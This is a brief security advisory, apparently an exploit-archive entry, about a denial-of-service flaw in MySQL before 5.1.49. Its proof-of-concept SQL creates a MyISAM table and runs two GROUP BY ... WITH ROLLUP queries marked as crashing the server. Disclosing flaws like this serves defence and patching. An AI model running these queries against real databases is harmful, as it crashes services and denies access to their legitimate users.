===================================================================

Source: http://www.securityfocus.com/bid/42596/info
 
MySQL is prone to a denial-of-service vulnerability.
 
An attacker can exploit this issue to crash the database, denying access to legitimate users.
 
This issue affects versions prior to MySQL 5.1.49.
 
 
PoC:
 
drop table if exists `t1`;
create table `t1`(`a` int)engine=myisam;
insert into `t1` values (1);
/*crash1*/select (`a` in (`a`,`a`)) from `t1` group by `a` with rollup;
/*crash2*/select (case (`a`) when (`a`) then (`a`) end) as `a` from `t1` group by `a`
with rollup;
